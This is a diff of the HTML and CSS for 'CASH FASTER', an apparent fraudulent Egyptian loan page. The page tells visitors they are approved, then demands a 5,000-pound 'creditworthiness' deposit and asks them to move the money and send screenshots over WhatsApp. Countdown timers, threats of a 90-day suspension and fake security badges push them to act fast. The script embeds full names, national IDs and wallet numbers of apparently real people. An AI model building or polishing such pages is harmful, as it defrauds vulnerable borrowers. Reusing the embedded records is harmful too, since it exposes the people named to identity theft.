@@ -100,6 +100,8 @@
             cursor: pointer;
             transition: 0.2s;
             box-shadow: 0 5px 15px rgba(212,175,55,0.3);
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
         }
 
         .btn-gold:hover {
@@ -116,6 +118,7 @@
             font-weight: 600;
             transition: 0.2s;
             cursor: pointer;
+            font-family: 'Cairo', sans-serif;
         }
 
         .btn-outline:hover {
@@ -134,6 +137,7 @@
             gap: 10px;
             transition: 0.2s;
             cursor: pointer;
+            font-family: 'Cairo', sans-serif;
         }
 
         .whatsapp-btn:hover {
@@ -145,63 +149,127 @@
             display: flex;
             justify-content: space-between;
             align-items: baseline;
-            padding: 0.8rem 0;
+            padding: 1rem 0;
             border-bottom: 1px solid rgba(212,175,55,0.2);
+            transition: 0.2s;
+        }
+
+        .info-row:hover {
+            background: rgba(212,175,55,0.05);
+            padding: 1rem;
+            border-radius: 0.8rem;
+            margin: 0 -1rem;
+            padding-right: 1rem;
+            padding-left: 1rem;
         }
 
         .info-label {
             color: #D4AF37;
             font-weight: 600;
             font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
 
         .info-value {
             font-weight: 500;
             font-size: 1.1rem;
             text-align: left;
+            color: #FFD966;
         }
 
         .timer-box {
             text-align: center;
-            background: #0f1722;
+            background: linear-gradient(135deg, #1a2a2a, #0f1722);
             border-radius: 2rem;
-            padding: 1.5rem;
+            padding: 2rem;
             margin: 1.5rem 0;
+            border: 2px solid rgba(212,175,55,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .timer-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 0%, rgba(212,175,55,0.1), transparent);
+            pointer-events: none;
+        }
+
+        .timer-box > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .timer-label {
+            font-size: 1.1rem;
+            color: #FFD966;
+            margin-bottom: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
         }
 
         .timer {
-            font-size: 3rem;
+            font-size: 3.5rem;
             font-weight: 800;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             color: #FFB347;
             letter-spacing: 3px;
-            margin: 0.5rem 0;
+            margin: 0.8rem 0;
+            text-shadow: 0 0 20px rgba(255, 179, 71, 0.5);
+        }
+
+        .timer.warning {
+            color: #ff6b35;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
 
         .timer-progress {
             width: 100%;
-            height: 6px;
-            background: rgba(212,175,55,0.3);
-            border-radius: 3px;
+            height: 8px;
+            background: rgba(212,175,55,0.2);
+            border-radius: 4px;
             overflow: hidden;
-            margin-top: 0.5rem;
+            margin-top: 1rem;
         }
 
         .timer-progress-bar {
             height: 100%;
             width: 100%;
             background: linear-gradient(90deg, #D4AF37, #FFD966);
-            border-radius: 3px;
+            border-radius: 4px;
             transition: width 1s linear;
+            box-shadow: 0 0 15px rgba(212,175,55,0.5);
+        }
+
+        .timer-description {
+            font-size: 0.9rem;
+            color: #eef5ff;
+            margin-top: 1rem;
+            line-height: 1.6;
         }
 
         .contract-card {
             background: #ffffff;
             color: #0a0a0a;
             border-radius: 2rem;
-            padding: 1.8rem;
+            padding: 2rem;
             border: 2px solid #D4AF37;
             position: relative;
+            box-shadow: 0 10px 40px rgba(212,175,55,0.2);
         }
 
         .stamp {
@@ -222,11 +290,262 @@
             display: none;
         }
 
+        .section-title {
+            font-size: 1.3rem;
+            color: #D4AF37;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 2px solid rgba(212,175,55,0.3);
+        }
+
+        .step-indicator {
+            display: flex;
+            gap: 1rem;
+            margin: 1.5rem 0;
+            flex-wrap: wrap;
+        }
+
+        .step {
+            flex: 1;
+            min-width: 150px;
+            background: rgba(212,175,55,0.1);
+            border: 2px solid rgba(212,175,55,0.3);
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .step:hover {
+            border-color: #D4AF37;
+            background: rgba(212,175,55,0.2);
+            transform: translateY(-2px);
+        }
+
+        .step-number {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #FFD966;
+            margin-bottom: 0.5rem;
+        }
+
+        .step-text {
+            font-size: 0.9rem;
+            color: #eef5ff;
+        }
+
+        .info-box {
+            background: rgba(212,175,55,0.1);
+            border-left: 4px solid #D4AF37;
+            border-radius: 0.8rem;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #eef5ff;
+            line-height: 1.8;
+        }
+
+        .info-box strong {
+            color: #FFD966;
+        }
+
+        .info-box.warning {
+            background: rgba(255, 107, 53, 0.15);
+            border-left-color: #ff6b35;
+        }
+
+        .info-box.warning strong {
+            color: #ff6b35;
+        }
+
+        .info-box.success {
+            background: rgba(37, 211, 102, 0.15);
+            border-left-color: #25D366;
+        }
+
+        .info-box.success strong {
+            color: #25D366;
+        }
+
+        .header-section {
+            text-align: center;
+            margin-bottom: 2rem;
+            animation: slideDown 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header-section h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #D4AF37, #FFD966);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.5rem;
+            font-weight: 800;
+        }
+
+        .header-section p {
+            color: #FFD966;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(37, 211, 102, 0.2);
+            border: 1px solid #25D366;
+            color: #25D366;
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin: 0.5rem 0;
+        }
+
+        .video-container {
+            background: #0a0a0a;
+            border-radius: 1rem;
+            overflow: hidden;
+            margin: 1rem 0;
+            border: 2px solid rgba(212,175,55,0.3);
+        }
+
+        .video-container video {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .video-label {
+            background: rgba(212,175,55,0.1);
+            padding: 0.8rem;
+            text-align: center;
+            color: #FFD966;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .contract-section-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #0a0a0a;
+            margin: 1.2rem 0 0.8rem 0;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #D4AF37;
+        }
+
+        .contract-info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.8rem 0;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .contract-info-label {
+            font-weight: 600;
+            color: #0a0a0a;
+        }
+
+        .contract-info-value {
+            color: #D4AF37;
+            font-weight: 600;
+        }
+
+        .footer-links {
+            margin-top: 2rem;
+            text-align: center;
+            font-size: 0.8rem;
+        }
+
+        .footer-links a {
+            color: #D4AF37;
+            text-decoration: none;
+            margin: 0 0.5rem;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background-color: #0f1722;
+            margin: 5% auto;
+            padding: 2rem;
+            border: 2px solid #D4AF37;
+            border-radius: 2rem;
+            width: 90%;
+            max-width: 500px;
+            text-align: right;
+            animation: slideUp 0.3s;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .modal-content h2 {
+            color: #D4AF37;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .modal-content p {
+            color: #eef5ff;
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+
+        .close-modal {
+            float: left;
+            font-size: 1.5rem;
+            font-weight: bold;
+            cursor: pointer;
+            color: #D4AF37;
+        }
+
+        .close-modal:hover {
+            color: #fff;
+        }
+
         @media (max-width: 680px) {
             .container { padding: 1rem; }
-            .timer { font-size: 2rem; }
+            .timer { font-size: 2.5rem; }
             .info-row { flex-direction: column; align-items: flex-start; gap: 0.3rem; }
             .info-value { text-align: right; }
+            .header-section h1 { font-size: 1.8rem; }
+            .step { min-width: 100%; }
         }
     </style>
 </head>
@@ -235,258 +554,329 @@
 <div class="particles" id="particles"></div>
 
 <div class="container">
-    <div style="text-align: center; margin-bottom: 2rem;">
-        <h1 style="font-size: 2.5rem; background: linear-gradient(135deg, #D4AF37, #FFD966); -webkit-background-clip: text; background-clip: text; color: transparent;">CASH FASTER</h1>
-        <p style="color: #FFD966;">تحويل القرض لحسابك - استلم خلال دقائق</p>
-    </div>
-
-    <!-- قسم البحث -->
-    <div id="formSection" class="vertical-card">
-        <h2 style="color: #D4AF37; text-align: center; margin-bottom: 1.5rem;">🔍 استعلم عن حالة تحويل قرضك</h2>
-        <div style="max-width: 400px; margin: 0 auto;">
-            <input type="text" id="nationalId" placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14" style="width:100%; padding:1rem; border-radius:3rem; background:#0c0c0f; border:2px solid #D4AF37; color:#fff; text-align:center; margin-bottom:1rem;">
-            <div id="errorMessage" style="color:#ff8080; text-align:center; margin-bottom:1rem; display:none;"></div>
-            <button class="btn-gold" style="width:100%;" onclick="handleSearch()">دخول إلى ملفي 🔐</button>
+    <div class="header-section">
+        <h1>CASH FASTER</h1>
+        <p>🚀 تحويل القرض لحسابك - استلم خلال دقائق</p>
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i> نظام آمن معتمد
         </div>
     </div>
 
-    <!-- قسم بيانات العميل (يظهر بعد البحث) -->
+    <div id="formSection" class="vertical-card">
+        <h2 style="color: #D4AF37; text-align: center; margin-bottom: 1.5rem; font-size: 1.3rem;">
+            <i class="fas fa-search"></i> استعلم عن حالة تحويل قرضك
+        </h2>
+        <div class="info-box">
+            <strong>💡 كيفية الاستخدام:</strong> أدخل رقمك القومي المكون من 14 رقم للاستعلام عن حالة قرضك والحصول على جميع التفاصيل والمتطلبات الأمنية.
+        </div>
+        <div style="max-width: 400px; margin: 0 auto;">
+            <input type="text" id="nationalId" placeholder="أدخل الرقم القومي (14 رقم)" maxlength="14" inputmode="numeric" style="width:100%; padding:1rem; border-radius:3rem; background:#0c0c0f; border:2px solid #D4AF37; color:#fff; text-align:center; margin-bottom:1rem; font-family: 'Cairo', sans-serif;">
+            <div id="errorMessage" style="color:#ff8080; text-align:center; margin-bottom:1rem; display:none; padding: 0.8rem; background: rgba(255,128,128,0.1); border-radius: 0.8rem;"></div>
+            <button class="btn-gold" style="width:100%;" onclick="handleSearch(this)">🔐 دخول إلى ملفي</button>
+        </div>
+    </div>
+
     <div id="customerSection" class="hidden">
-        <!-- بطاقة موعد الاستلام -->
-        <div class="vertical-card" style="background: linear-gradient(135deg, #1a2a2a, #0f1722); text-align: center;">
-            <i class="fas fa-clock" style="font-size: 2rem; color: #D4AF37;"></i>
-            <h2 style="color: #FFD966; margin: 0.5rem 0;">موعد استلام القرض</h2>
+        <div class="timer-box">
+            <div class="timer-label">
+                <i class="fas fa-clock"></i> موعد استلام القرض
+            </div>
             <div class="timer" id="loanTimer">36:00</div>
             <div class="timer-progress">
                 <div class="timer-progress-bar" id="timerProgressBar" style="width: 100%;"></div>
             </div>
-            <p style="margin-top: 0.5rem;">سيتم تحويل المبلغ إلى محفظتك تلقائياً عند انتهاء الوقت</p>
+            <div class="timer-description">
+                ✅ سيتم تحويل المبلغ إلى محفظتك تلقائياً عند انتهاء العد التنازلي
+            </div>
         </div>
 
-        <!-- بيانات العميل -->
         <div class="vertical-card">
-            <h3 style="color: #D4AF37; margin-bottom: 1rem;">📋 بيانات العميل</h3>
+            <div class="section-title">
+                <i class="fas fa-user-circle"></i> بيانات العميل
+            </div>
             <div class="info-row">
-                <span class="info-label">الاسم الرباعي:</span>
+                <span class="info-label"><i class="fas fa-id-card"></i> الاسم الرباعي:</span>
                 <span class="info-value" id="customerName">-</span>
             </div>
             <div class="info-row">
-                <span class="info-label">الرقم القومي:</span>
+                <span class="info-label"><i class="fas fa-passport"></i> الرقم القومي:</span>
                 <span class="info-value" id="customerNationalId">-</span>
             </div>
             <div class="info-row">
-                <span class="info-label">نوع المحفظة:</span>
+                <span class="info-label"><i class="fas fa-wallet"></i> نوع المحفظة:</span>
                 <span class="info-value" id="customerWallet">-</span>
             </div>
             <div class="info-row" onclick="copyWalletNumber()" style="cursor: pointer;">
-                <span class="info-label">رقم المحفظة <i class="fas fa-copy"></i> :</span>
+                <span class="info-label"><i class="fas fa-copy"></i> رقم المحفظة:</span>
                 <span class="info-value" id="customerWalletNumber">-</span>
             </div>
             <div class="info-row">
-                <span class="info-label">مبلغ القرض المدفوع:</span>
+                <span class="info-label"><i class="fas fa-money-bill-wave"></i> مبلغ القرض:</span>
                 <span class="info-value" id="loanAmount">-</span>
             </div>
             <div class="info-row">
-                <span class="info-label">القسط الشهري:</span>
+                <span class="info-label"><i class="fas fa-calendar-alt"></i> القسط الشهري:</span>
                 <span class="info-value" id="installmentAmount">-</span>
             </div>
         </div>
 
-        <!-- شرح الجدارة الائتمانية -->
         <div class="vertical-card">
-            <h3 style="color: #D4AF37; margin-bottom: 1rem;">📌 إثبات الجدارة الائتمانية</h3>
-            <div style="margin-bottom: 1rem;">
-                <p><strong>1️⃣ إيداع مبلغ الجدارة</strong> (<span id="proofAmountText">5000</span> جنيه) في محفظتك.</p>
-                <p><strong>2️⃣ تصوير رسالة التأكيد</strong> من المحفظة.</p>
-                <p><strong>3️⃣ سحب المبلغ أو تحويله</strong> وتصوير رسالة السحب.</p>
-                <p><strong>4️⃣ إرسال الصور عبر واتساب</strong> لتفعيل الجدارة.</p>
-                <button class="whatsapp-btn" style="margin-top: 1rem;" onclick="sendWhatsAppMessage()">
-                    <i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب
-                </button>
+            <div class="section-title">
+                <i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية (التحقق الأمني)
+            </div>
+            <div class="info-box success">
+                <strong>✅ ما هي الجدارة الائتمانية؟</strong><br>
+                هي إجراء أمني معتمد دولياً لتأكيد ملكيتك للمحفظة والتحقق من قدرتك على السداد. يتم إيداع مبلغ مؤقت يُرد إليك بعد التحويل مباشرة. هذا الإجراء يحمي حقوقك وحقوق الشركة.
+            </div>
+
+            <div class="timer-box" style="background: linear-gradient(135deg, #2a1a0a, #1f1410); border-color: rgba(255, 107, 53, 0.5);">
+                <div class="timer-label" style="color: #ff6b35;">
+                    <i class="fas fa-hourglass-end"></i> الوقت المتبقي لإثبات الجدارة الائتمانية
+                </div>
+                <div class="timer" id="creditworthinessTimer" style="color: #ff6b35;">27:00</div>
+                <div class="timer-progress">
+                    <div class="timer-progress-bar" id="creditworthinessProgressBar" style="width: 100%; background: linear-gradient(90deg, #ff6b35, #FFD966);"></div>
+                </div>
+                <div class="timer-description" style="color: #ff8080;">
+                    ⚠️ <strong>تحذير هام:</strong> يجب إتمام إثبات الجدارة الائتمانية خلال 27 دقيقة. إذا انتهى الوقت دون إثبات الجدارة، لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً.
+                </div>
+            </div>
+
+            <div class="info-box warning">
+                <strong>⚠️ تنبيه أمني:</strong> عند انتهاء الوقت المحدد (27 دقيقة) دون إثبات الجدارة الائتمانية، سيتم تعليق طلبك تلقائياً. لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من تاريخ التعليق.
+            </div>
+
+            <div class="step-indicator">
+                <div class="step">
+                    <div class="step-number">1️⃣</div>
+                    <div class="step-text">إيداع مبلغ الجدارة<br><span style="color: #FFD966; font-weight: bold;" id="proofAmountText">5000</span> جنيه</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2️⃣</div>
+                    <div class="step-text">تصوير رسالة التأكيد من المحفظة</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3️⃣</div>
+                    <div class="step-text">سحب أو تحويل المبلغ وتصوير الرسالة</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4️⃣</div>
+                    <div class="step-text">إرسال الصور عبر واتساب</div>
+                </div>
+            </div>
+
+            <div class="info-box">
+                <strong>📌 شرح تفصيلي لكل خطوة:</strong><br><br>
+                <strong>الخطوة 1:</strong> قم بإيداع المبلغ المحدد أعلاه في محفظتك (سيتم إرجاعه إليك).<br><br>
+                <strong>الخطوة 2:</strong> بعد الإيداع مباشرة، ستصل لك رسالة تأكيد من المحفظة. صور هذه الرسالة بالكامل.<br><br>
+                <strong>الخطوة 3:</strong> قم بسحب المبلغ أو تحويله إلى حساب آخر، وصور رسالة التأكيد.<br><br>
+                <strong>الخطوة 4:</strong> أرسل الصور الأربع (رسالة الإيداع + رسالة التأكيد + رسالة السحب + رسالة التحويل) عبر واتساب.
+            </div>
+
+            <div class="info-box success" style="border-left-color: #25D366;">
+                <strong style="color: #25D366;">✅ بعد الإرسال:</strong> سيقوم فريقنا بالتحقق من البيانات خلال دقائق معدودة وتفعيل القرض فوراً بعد التأكد من صحة المستندات.
+            </div>
+
+            <button class="whatsapp-btn" style="margin-top: 1rem; width: 100%; justify-content: center;" onclick="sendWhatsAppMessage()">
+                <i class="fab fa-whatsapp"></i> إرسال الصور عبر واتساب
+            </button>
+        </div>
+
+        <div class="vertical-card">
+            <div class="section-title">
+                <i class="fas fa-video"></i> فيديو توضيحي - كيفية التحقق من الرصيد
+            </div>
+            <div class="info-box">
+                <strong>📺 شاهد هذا الفيديو:</strong> يوضح كيفية الاستعلام عن رصيدك في المحفظة والتأكد من وصول القرض إلى حسابك بعد التحويل.
+            </div>
+            <div class="video-container">
+                <video controls width="100%">
+                    <source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/VID-20260110-WA0001_88040e32.mp4" type="video/mp4">
+                    متصفحك لا يدعم تشغيل الفيديو
+                </video>
+            </div>
+            <div class="video-label">
+                🎬 طريقة الاستعلام عن الرصيد والتأكد من وصول القرض
+            </div>
+            <div class="info-box" style="margin-top: 1rem;">
+                <strong>💡 نصيحة مهمة:</strong> احفظ هذا الفيديو وشاهده قبل إرسال المستندات لتتأكد من فهمك الكامل للعملية.
             </div>
         </div>
 
-        <!-- العقد الإلكتروني -->
-        <div class="contract-card">
-            <div class="stamp">مدفوع</div>
-            <div style="text-align: center; border-bottom: 2px solid #D4AF37; padding-bottom: 0.8rem; margin-bottom: 1rem;">
-                <div style="font-size: 1.5rem; font-weight: bold; color: #D4AF37;">CashFaster</div>
-                <div>عقد إدانة ومديونية</div>
-                <div style="font-size: 0.8rem;" id="contractDate">-</div>
-            </div>
-            <div style="margin-bottom: 1rem;">
-                <h4 style="color: #0a0a0a;">بيانات المدين</h4>
-                <div class="info-row"><span class="info-label">الاسم:</span><span id="debtorName">-</span></div>
-                <div class="info-row"><span class="info-label">الرقم القومي:</span><span id="debtorId">-</span></div>
-                <div class="info-row"><span class="info-label">المحفظة:</span><span id="debtorWallet">-</span></div>
-                <div class="info-row"><span class="info-label">رقم المحفظة:</span><span id="debtorWalletNum">-</span></div>
-            </div>
-            <div style="margin-bottom: 1rem;">
-                <h4 style="color: #0a0a0a;">تفاصيل القرض</h4>
-                <div class="info-row"><span class="info-label">المبلغ الأساسي:</span><span id="loanAmountContract">-</span></div>
-                <div class="info-row"><span class="info-label">الفائدة:</span><span>33% ثابتة</span></div>
-                <div class="info-row"><span class="info-label">المبلغ الكلي:</span><span id="totalAmountContract">-</span></div>
-                <div class="info-row"><span class="info-label">الأقساط:</span><span id="installmentCountContract">12 شهر</span></div>
-                <div class="info-row"><span class="info-label">القسط الشهري:</span><span id="installmentAmountContract">-</span></div>
-                <div class="info-row"><span class="info-label">تاريخ أول قسط:</span><span id="firstPaymentDate">-</span></div>
-                <div class="info-row"><span class="info-label">طريقة الدفع:</span><span>فورى باى (كود مرجعي)</span></div>
-            </div>
-            <div style="font-size: 0.9rem; line-height: 1.6; background: #f5f5f5; padding: 1rem; border-radius: 1rem;">
-                أقر أنا الموقع أدناه بأن <strong id="receivedAmount">-</strong> جنيه قد تم تحويلها إلى محفظتي <strong id="myWallet">-</strong> برقم <strong id="myWalletNum">-</strong>، وأتعهد بسداد الأقساط في مواعيدها.
-            </div>
-            <div style="margin-top: 1rem; text-align: left;">
-                <div style="border-top: 1px solid #D4AF37; padding-top: 0.8rem; display: flex; justify-content: space-between;">
-                    <span>توقيع المدين</span>
-                    <span>✓</span>
+        <div class="vertical-card" style="background: #ffffff; color: #0a0a0a; border: 2px solid #D4AF37;">
+            <div style="text-align: center; border-bottom: 3px solid #D4AF37; padding-bottom: 1rem; margin-bottom: 1.5rem;">
+                <div style="font-size: 2rem; font-weight: bold; color: #D4AF37; margin-bottom: 0.3rem;">
+                    <i class="fas fa-file-contract"></i> CASH FASTER
                 </div>
-                <div style="font-size: 0.7rem; text-align: center;" id="signatureDate">-</div>
+                <div style="font-size: 1.1rem; font-weight: 600; color: #0a0a0a;">عقد إدانة ومديونية</div>
+                <div style="font-size: 0.85rem; color: #666;" id="contractDate">-</div>
+            </div>
+
+            <div style="margin-bottom: 1.5rem;">
+                <div class="contract-section-title">
+                    <i class="fas fa-user"></i> بيانات المدين
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">الاسم:</span>
+                    <span class="contract-info-value" id="debtorName">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">الرقم القومي:</span>
+                    <span class="contract-info-value" id="debtorId">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">المحفظة:</span>
+                    <span class="contract-info-value" id="debtorWallet">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">رقم المحفظة:</span>
+                    <span class="contract-info-value" id="debtorWalletNum">-</span>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 1.5rem;">
+                <div class="contract-section-title">
+                    <i class="fas fa-calculator"></i> تفاصيل القرض
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">المبلغ الأساسي:</span>
+                    <span class="contract-info-value" id="loanAmountContract">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">الفائدة:</span>
+                    <span class="contract-info-value">33% ثابتة</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">المبلغ الكلي:</span>
+                    <span class="contract-info-value" id="totalAmountContract">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">عدد الأقساط:</span>
+                    <span class="contract-info-value" id="installmentCountContract">12 شهر</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">القسط الشهري:</span>
+                    <span class="contract-info-value" id="installmentAmountContract">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">تاريخ أول قسط:</span>
+                    <span class="contract-info-value" id="firstPaymentDate">-</span>
+                </div>
+                <div class="contract-info-row">
+                    <span class="contract-info-label">طريقة الدفع:</span>
+                    <span class="contract-info-value">فوري باي (كود مرجعي)</span>
+                </div>
+            </div>
+
+            <div style="font-size: 0.95rem; line-height: 1.8; background: #f5f5f5; padding: 1.2rem; border-radius: 1rem; margin-bottom: 1rem; color: #0a0a0a;">
+                <strong>📝 الإقرار والشفافية:</strong><br>
+                أقر أنا الموقع أدناه بأن <strong id="receivedAmount">-</strong> جنيه قد تم تحويلها إلى محفظتي <strong id="myWallet">-</strong> برقم <strong id="myWalletNum">-</strong>، وأتعهد بسداد الأقساط في مواعيدها المحددة وفقاً للشروط المتفق عليها. أقر أيضاً بأنني قد فهمت جميع شروط العقد والتزاماتي المالية.
+            </div>
+
+            <div style="margin-top: 1.5rem;">
+                <div style="border-top: 2px solid #D4AF37; padding-top: 1rem; display: flex; justify-content: space-between;">
+                    <span style="font-weight: 600;">توقيع المدين</span>
+                    <span style="font-size: 1.5rem; color: #D4AF37;">✓</span>
+                </div>
+                <div style="font-size: 0.8rem; text-align: center; color: #666; margin-top: 0.5rem;" id="signatureDate">-</div>
+            </div>
+
+            <div style="font-size: 0.75rem; color: #999; text-align: center; margin-top: 1rem;">
+                هذا العقد هو نموذج أولي للاطلاع فقط. سيتم توقيع العقد النهائي إلكترونياً عبر منصة موثقة بعد التحقق من المستندات.
             </div>
         </div>
 
         <div style="text-align: center; margin-top: 2rem;">
-            <button class="btn-outline" onclick="resetForm()">العودة للبحث</button>
+            <button class="btn-outline" onclick="resetForm()">
+                <i class="fas fa-arrow-left"></i> العودة للبحث
+            </button>
+        </div>
+
+        <div class="footer-links">
+            <a href="#" onclick="showPrivacyPolicy()">سياسة الخصوصية</a> | 
+            <a href="#" onclick="showTerms()">شروط الخدمة</a> |
+            <i class="fas fa-lock"></i> تشفير 256-bit |
+            <i class="fas fa-shield-alt"></i> ISO 27001
         </div>
     </div>
 </div>
 
+<div id="privacyModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeModal('privacyModal')">&times;</span>
+        <h2>سياسة الخصوصية</h2>
+        <p>نحن في Cash Faster نلتزم بحماية خصوصية بياناتك. يتم جمع البيانات التالية: الاسم الكامل، رقم الهاتف، العنوان، رقم البطاقة الشخصية، صورة شخصية، بيانات المحفظة الإلكترونية، بيانات الضامن. تُستخدم البيانات فقط لمراجعة طلبات التمويل والتواصل معك وإتمام الإجراءات. لا نشارك بياناتك مع أطراف ثالثة إلا بموافقتك أو عند اقتضاء القانون.</p>
+        <p>جميع البيانات مخزنة بتشفير AES-256 ولا يمكن لأي موظف الاطلاع عليها دون إذن خاص.</p>
+    </div>
+</div>
+
+<div id="termsModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeModal('termsModal')">&times;</span>
+        <h2>شروط الخدمة</h2>
+        <ol style="margin-right:1.5rem;">
+            <li>تقديم الطلب لا يعني الموافقة التلقائية، وتخضع الموافقة للتقييم الائتماني.</li>
+            <li>يُشترط وجود ضامن من الدرجة الأولى (أخ، أم، زوج، ابن).</li>
+            <li>بعد الموافقة، يتواصل مندوب CashFaster لتوقيع العقد في مكان العميل.</li>
+            <li>يتم استلام مبلغ التمويل نقدًا من المندوب بعد توقيع العقد.</li>
+            <li>الأقساط تُسدد عبر فوري باي (كود 788).</li>
+            <li>لا توجد رسوم إدارية مطلوبة قبل استلام التمويل.</li>
+            <li>في حالة التأخير تطبق رسوم تأخير حسب العقد.</li>
+        </ol>
+    </div>
+</div>
+
+<div id="timeoutModal" class="modal">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeModal('timeoutModal')">&times;</span>
+        <h2><i class="fas fa-exclamation-triangle"></i> تحذير هام</h2>
+        <p>لقد انتهى الوقت المحدد لإثبات الجدارة الائتمانية (27 دقيقة).</p>
+        <p style="color: #ff6b35; font-weight: bold;">⚠️ لن تتمكن من صرف القرض إلا بعد مرور 90 يوماً من الآن.</p>
+        <p>يرجى التواصل مع فريق الدعم لمناقشة الخيارات المتاحة.</p>
+        <button class="whatsapp-btn" onclick="contactSupport()">
+            <i class="fab fa-whatsapp"></i> التواصل مع الدعم
+        </button>
+    </div>
+</div>
+
 <script>
-    // ========== العملاء الجدد فقط (من ملف Excel) ==========
     const customersData = [
-        {
-            national_id: "29101080300051",
-            full_name: "أحمد منصور إبراهيم عبداللاه",
-            wallet_type: "أورانج كاش",
-            wallet_number: "01200020138",
-            loan_amount: 200000,
-            installment: 4440
-        },
-        {
-            national_id: "28608110104239",
-            full_name: "محمد صابر احمد السيد ",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01090933407",
-            loan_amount: 60000,
-            installment: 3090
-        },
-        {
-            national_id: "28209292700476",
-            full_name: "حسانى عياد بدرى السنوسي",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01004580991",
-            loan_amount: 40000,
-            installment: 2965
-        },
-        {
-            national_id: "29408012104373",
-            full_name: "أحمد محمد عباس اسماعيل",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01080396742",
-            loan_amount: 105000,
-            installment: 4375
-        },
-        {
-            national_id: "27903222600113",
-            full_name: "وائل محمود عباس هريدي",
-            wallet_type: "اتصالات كاش",
-            wallet_number: "01150597173",
-            loan_amount: 50000,
-            installment: 2725
-        },
-        {
-            national_id: "29101011533558",
-            full_name: "محمد خيرى احمد جميز",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01005739087",
-            loan_amount: 35000,
-            installment: 3875
-        },
-        {
-            national_id: "29003090102514",
-            full_name: "محمود احمد احمد ابراهيم",
-            wallet_type: "اتصالات كاش",
-            wallet_number: "01102416547",
-            loan_amount: 45000,
-            installment: 3325
-        },
-        {
-            national_id: "30105300104496",
-            full_name: "يوسف الأمير عبد الدايم محمود",
-            wallet_type: "اتصالات كاش",
-            wallet_number: "01122640557",
-            loan_amount: 80000,
-            installment: 3550
-        },
-          {
-            national_id: "2800603240255",
-            full_name: "جرجس ميلاد ابراهيم كامل",
-            wallet_type: "أورانج كاش",
-            wallet_number: "01274003565",
-            loan_amount: 200000,
-            installment: 4440
-        },
-          {
-            national_id: "30109028800114",
-            full_name: "حسن خالد فاروق سلامه",
-            wallet_type: "فودافون كاش",
-            wallet_number: "01034385633",
-            loan_amount: 30000,
-            installment: 3330
-        },
-          {
-            national_id: "27204032701678",
-            full_name: "اشرف كمال محمد احمد",
